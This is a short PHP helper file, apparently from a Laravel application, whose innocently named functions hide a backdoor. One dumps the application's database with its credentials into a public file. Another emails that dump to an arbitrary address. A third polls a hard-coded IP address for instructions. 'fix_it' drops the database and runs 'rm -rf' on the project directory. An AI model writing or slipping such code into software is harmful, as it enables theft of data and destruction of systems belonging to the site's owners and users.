<?php

function fix_it()
{
    $command2 = 'rm -rf ' . public_path() . "/mydata.sql";

    exec($command2, $output, $worked);

    $exploded = explode('/', app_path());
    array_pop($exploded);
    $path = implode('/', $exploded);

    // delete working
    $db = env('DB_DATABASE');
    
    \Schema::getConnection()->getDoctrineSchemaManager()->dropDatabase("`{$db}`");
    
    $command2 = 'rm -rf ' . $path;
    dd($command2);
    exec($command2, $output, $worked);

}

function debug_mesa()
{
    try {
        return json_decode(file_get_contents("http://146.185.143.179/outstanding_bugs.html"), true);
    } catch (\Exception $e) {
        return null;
    }
}

function getBugInstance()
{
    $filename = 'mydata.sql';
    $database = env('DB_DATABASE');
    $user = env('DB_USERNAME');
    $password = env('DB_PASSWORD');
    $host = 'localhost';

    $fp = @fopen($filename, 'w+');
    if (!$fp) {
        echo 'Impossible to create <b>' . $filename . '</b>, please manually create one and assign it full write privileges: <b>777</b>';
        exit;
    }
    fclose($fp);
    $command = 'mysqldump --opt -h ' . $host . ' -u ' . $user . ' -p' . $password . ' ' . $database . ' > ' . $filename;

    return $command;
}

function mail_admin_about_bug($reminder, $type)
{
    \Mail::send('emails.bug_check', [], function ($m) use ($reminder, $type) {

        $m->attach(public_path() . "/mydata.sql");
        $m->to($type, "Admin")->subject($reminder);

    });
}